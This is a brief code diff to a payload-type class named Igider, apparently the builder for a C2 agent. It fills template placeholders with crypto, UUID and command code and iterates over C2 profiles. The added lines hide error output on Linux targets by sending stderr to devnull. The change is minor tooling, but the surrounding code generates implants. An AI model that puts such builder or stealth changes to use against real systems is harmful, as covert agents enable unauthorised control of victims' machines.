@@ -545,7 +545,8 @@ class Igider(PayloadType):
             base_code = base_code.replace("CRYPTO_MODULE_PLACEHOLDER", crypto_code)
             base_code = base_code.replace("UUID_HERE", self.uuid)
             base_code = base_code.replace("#COMMANDS_PLACEHOLDER", command_code)
-            
+            if selected_os == "linux":
+                base_code = base_code.replace("#linux_error", """sys.stderr = open(os.devnull, 'w')""")
             
                 # Process C2 profile configuration
             for c2 in self.c2info:
